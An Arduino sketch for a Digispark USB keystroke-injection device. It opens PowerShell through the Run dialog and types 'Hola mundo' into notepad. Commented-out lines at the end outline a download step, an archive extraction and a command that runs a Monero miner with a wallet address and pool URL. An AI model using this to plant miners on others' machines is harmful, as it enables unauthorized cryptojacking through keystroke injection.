#include "DigiKeyboard.h"

int LED_PIN = 1;
int KEY_DELAY = 1000;

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  digitalWrite(LED_PIN, HIGH);
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(KEY_DELAY);
  
  // Ejecutar CMD
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(KEY_DELAY);

  // Abrir notepad y hola mundo
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(KEY_DELAY);
  
  DigiKeyboard.println("Hola mundo");

  digitalWrite(LED_PIN, LOW);

  for(;;){ }

  // Expand-Archive -Force C:\path\to\archive.zip C:\where\to\extract\to
  // Invoke-WebRequest https://github.com/hsgw/plaid/blob/master/doc/img/plaid.jpg -O plaid.jpg
  // .\minerd.exe -a cryptonight -u 458pdQ1HHaVeqx8kY9KktsTiwaeHgN1az6eJ96fadvHw3jwbK3cevM7egz4NctbVUmCKWF1HnqRwJfzqDbeqT8ev7PMTiAJ -p demonio -o stratum+tcp://pool.supportxmr.com:3333
  
}
